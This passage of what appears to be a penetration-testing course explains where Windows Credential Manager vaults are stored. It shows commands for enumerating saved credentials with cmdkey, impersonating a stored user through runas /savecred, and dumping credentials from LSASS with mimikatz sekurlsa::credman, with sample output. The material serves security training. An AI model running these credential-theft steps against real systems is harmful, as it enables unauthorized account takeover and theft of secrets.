Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI.
Microsoft often refers to the protected stores as `Credential Lockers` (formerly `Windows Vaults`). Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores: Web Credentials, Windows Credentials
![](Pasted%20image%2020260911222643.png)
It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
```
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

## Enumerating credentials with cmdkey
We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:
```
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:
```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```
## Extracting credentials with Mimikatz
There are many different tools that can be used to decrypt stored credentials. One of the tools we can use is [mimikatz](https://github.com/gentilkiwi/mimikatz). Even within `mimikatz`, there are multiple ways to attack these credentials - we can either dump credentials from memory using the `sekurlsa` module, or we can manually decrypt credentials using the `dpapi` module. For this example, we will target the LSASS process with `sekurlsa`:
```
C:\Users\Administrator\Desktop> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```
